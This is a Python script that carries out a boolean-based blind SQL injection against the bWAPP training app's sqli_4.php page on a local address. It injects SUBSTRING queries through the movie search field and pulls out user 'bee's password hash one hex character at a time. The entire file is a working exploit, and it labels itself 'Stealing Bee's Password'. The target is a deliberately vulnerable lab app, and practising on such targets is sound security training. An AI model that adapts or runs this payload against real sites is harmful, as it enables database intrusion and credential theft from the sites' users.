import requests


protocol = "http"
domain = "192.168.1.12"
page_name = "/bWAPP/sqli_4.php"
session_token = "aad845bf25d3f180b1a92f4328184616"
security_level = "0"

s = requests.Session();
cookie_obj = requests.cookies.create_cookie(domain=domain, name="PHPSESSID", value=session_token)
s.cookies.set_cookie(cookie_obj)
cookie_obj = requests.cookies.create_cookie(domain=domain, name="security_level", value=security_level)
s.cookies.set_cookie(cookie_obj)


url = protocol + '://' + domain + page_name

print("Stealing Bee's Password ...")
print("STARTING ATTACK")

password = ''
for x in list(range(1, 41)):
	for digit in ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']:
		query = "Iron Man' AND '" + digit +  "' = (SELECT SUBSTRING(password, " + str(x) + ", 1) from bWAPP.users where login = 'bee') -- )"
		payload = {"title":query, "action":"search"}
		response = s.get(url, params=payload)
		#print(response)
		if response.status_code != requests.codes.ok: 
		   exit("Status code not OK")
		if "The movie exists in our database!" in response.text:
			password = password + digit
			print(digit, end='', flush=True)
			break


print('\nTHE PASSWORD IS : ', password) 
